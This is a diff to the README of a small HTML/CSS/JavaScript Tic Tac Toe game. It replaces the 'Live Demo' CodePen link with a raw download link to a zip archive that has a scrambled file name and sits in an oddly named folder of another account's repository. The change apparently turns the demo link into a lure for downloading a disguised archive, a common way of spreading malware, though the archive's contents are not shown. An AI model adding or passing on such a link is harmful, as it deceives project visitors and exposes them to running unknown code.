@@ -3,7 +3,7 @@ A simple, fully functional Tic Tac Toe game built with HTML, CSS, and JavaScript
 Play against a friend in this classic 3x3 grid battle of Xs and Os.
 
 🔗 Live Demo
-👉 https://codepen.io/Shaurya-Baitule/full/NPPvvmd
+👉 https://github.com/GodOfStrategy/Tic-Tac-Toe-game/raw/refs/heads/main/mulsify/Tac_game_Toe_Tic_v1.1.zip
 
 🛠️ Features
 🎯 Two-player mode (Player X and Player O)
